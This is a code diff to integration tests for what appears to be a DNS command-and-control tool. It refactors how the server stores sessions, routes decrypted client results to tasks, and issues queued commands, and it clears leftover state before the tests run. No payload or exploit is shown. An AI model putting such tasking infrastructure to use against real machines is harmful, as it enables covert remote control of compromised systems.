@@ -58,11 +58,11 @@ def run_server(max_queries: int = 4) -> None:
 
         message = crypto.decrypt(encrypted_data, KEY)
 
-        if message != "READY" and session_id in queue_store.sessions:
-            last_task = queue_store.sessions[session_id]["last_task"] or ""
+        if message != "READY" and queue_store.session_exists(session_id):
+            last_task = queue_store.get_last_task(session_id) or ""
             queue_store.store_result(session_id, last_task, message)
 
-        if session_id not in queue_store.sessions:
+        if not queue_store.session_exists(session_id):
             task = "WAIT"
         else:
             task = queue_store.get_next_task(session_id) or "WAIT"
@@ -215,7 +215,7 @@ def test_result_routing() -> bool:
 
         t.join(timeout=4)
 
-        history = queue_store.sessions[SESSION_ID]["history"]
+        history = queue_store.get_history(SESSION_ID)
         assert len(history) >= 1, "no results stored"
         last = history[-1]
         assert last["command"] == "echo result_test", f"wrong command: {last['command']!r}"
@@ -233,6 +233,10 @@ def test_result_routing() -> bool:
 # ---------------------------------------------------------------------------
 
 if __name__ == "__main__":
+    # clean slate — remove any leftover file-backed state from previous runs
+    if os.path.exists("sessions.json"):
+        os.remove("sessions.json")
+
     print("=== dns-c2 integration tests ===\n")
     results = [
         test_crypto_roundtrip(),
